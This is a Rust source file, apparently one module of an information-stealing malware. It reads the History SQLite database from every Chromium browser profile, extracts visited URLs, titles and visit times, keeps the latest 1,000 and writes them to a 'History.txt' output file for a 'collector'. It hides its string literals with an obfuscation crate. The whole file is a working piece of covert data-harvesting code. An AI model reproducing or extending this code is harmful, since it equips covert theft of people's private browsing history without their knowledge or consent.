use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{read_and_collect_unique_records, to_string_and_write_all, History, SqliteDatabase};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};

const URLS_URL: usize = 1;
const URLS_TITLE: usize = 2;
const URLS_LAST_VISIT_TIME: usize = 5;

pub(super) struct HistoryTask {
    browser: Arc<BrowserData>,
}

impl HistoryTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
    parent_name!("History.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("History"),
            s!("Urls"),
            extract_history_from_record,
        ) else {
            return;
        };

        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(1000);

        collector.get_browser().increase_history_by(history.len());
        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
    }
}

fn extract_history_from_record<R: TableRecord>(record: &R) -> Option<History> {
    let url = record.get_value(URLS_URL)?.as_string()?;
    let title = record.get_value(URLS_TITLE)?.as_string()?;
    let last_visit_time = record.get_value(URLS_LAST_VISIT_TIME)?.as_integer()?;

    Some(History {
        url,
        title,
        last_visit_time,
    })
}
